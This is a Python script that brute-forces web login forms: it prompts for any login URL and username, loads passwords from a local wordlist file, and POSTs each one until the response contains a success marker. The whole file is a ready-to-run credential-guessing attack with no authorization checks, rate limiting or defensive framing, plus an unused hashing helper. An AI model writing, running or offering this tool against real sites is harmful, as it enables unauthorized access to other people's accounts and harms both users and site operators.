import hashlib
import requests
import os  # Import the os module for file path handling

HASH_ALGORITHM = "sha256"
FILENAME = "wordlist.txt"


def main():
    # Get the current script directory
    script_directory = os.path.dirname(os.path.realpath(__file__))

    # Construct the full path to the wordlist file
    wordlist_path = os.path.join(script_directory, FILENAME)

    # Check if the wordlist file exists
    if not os.path.exists(wordlist_path):
        print(f"Wordlist file '{FILENAME}' not found in the script directory.")
        return

    # Obtain the URL of the login form from the user
    login_url = input("Enter the URL of the login form: ")

    # Obtain the username from the user
    username = input("Enter the username: ")

    # Start the password brute-force process
    brute_force_passwords(login_url, username, wordlist_path)


def brute_force_passwords(login_url, username, wordlist_path):
    # Get the list of passwords from the wordlist file
    passwords = load_passwords(wordlist_path)

    # Iterate over the passwords and try each one
    for password in passwords:
        # Perform the login attempt
        login_successful = perform_login(login_url, username, password)

        # Check if the login was successful
        if login_successful:
            print("Password found:", password)
            return  # If the password is found, exit the program

    print("Password not found in the list.")


def perform_login(login_url, username, password):
    try:
        # Create the request data (username, password, etc.)
        data = {"username": username, "password": password}

        # Perform the HTTP POST request to the login form
        response = requests.post(login_url, data=data)

        # Check if the login was successful by analyzing the response
        if response.ok:
            response_body = response.text
            if "login_success" in response_body:
                # The login was successful
                return True
            else:
                # The login was not successful
                return False
        else:
            return False  # The login was not successful

    except Exception as e:
        return False  # Error and exception handling


def load_passwords(wordlist_path):
    passwords = []

    try:
        with open(wordlist_path, "r") as file:
            passwords = [line.strip() for line in file]

    except Exception as e:
        print("Error loading passwords:", str(e))

    return passwords


def hash_password(password):
    try:
        hashed_bytes = hashlib.sha256(password.encode("utf-8")).digest()
        hashed_password = ''.join(format(byte, '02x') for byte in hashed_bytes)
        return hashed_password
    except Exception as e:
        print("Error generating password hash:", str(e))
        return None


if __name__ == "__main__":
    main()
